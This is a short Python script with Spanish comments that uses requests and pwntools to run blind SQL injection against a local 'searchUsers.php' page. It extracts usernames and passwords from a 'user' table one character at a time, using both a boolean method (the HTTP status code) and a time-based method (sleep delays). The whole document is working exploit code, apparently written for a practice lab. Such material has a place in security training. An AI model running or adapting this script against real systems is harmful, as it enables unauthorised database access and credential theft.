#!/usr/bin/python3

import requests
from pwn import *
import time
import signal
import sys
import string

#Variables globales

main_url = "http://localhost/searchUsers.php"
characters = string.printable

def def_handler(sig, frame):
    print("\n\n[!] Saliendo... \n")
    sys.exit(1)

#Control + C

signal.signal(signal.SIGINT, def_handler)


def makeSQLI():
    
    p1 = log.progress("Fuerza Bruta")
    p1.status("Iniciando proceso de fuerza bruta")
    
    time.sleep(2)

    p2 = log.progress("Datos Extraidos")

    extracted_info = ""

    for position in range(1, 65):
        for character in range(33, 126):
            sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(username,0x3a,password) from user),%d,1)) from user where id=1)=%d)" % (position, character)
            
            p1.status(sqli_url)

            r = requests.get(sqli_url)

            if r.status_code == 200:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break

def makeSQLITime():
    
    p1 = log.progress("Fuerza Bruta por tiempo")
    p1.status("Iniciando proceso de fuerza bruta por tiempo")
    
    time.sleep(2)

    p2 = log.progress("Datos Extraidos")

    extracted_info = ""

    for position in range(1, 70):
        for character in range(33, 126):
            sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from user),%d,1))=%d,sleep(0.35),1)" % (position, character)
            
            p1.status(sqli_url)

            time_start = time.time()

            r = requests.get(sqli_url)

            time_end = time.time()

            if time_end - time_start > 0.35:
                extracted_info += chr(character)
                p2.status(extracted_info)
                break


if __name__ == '__main__':
    makeSQLI()
    makeSQLITime()
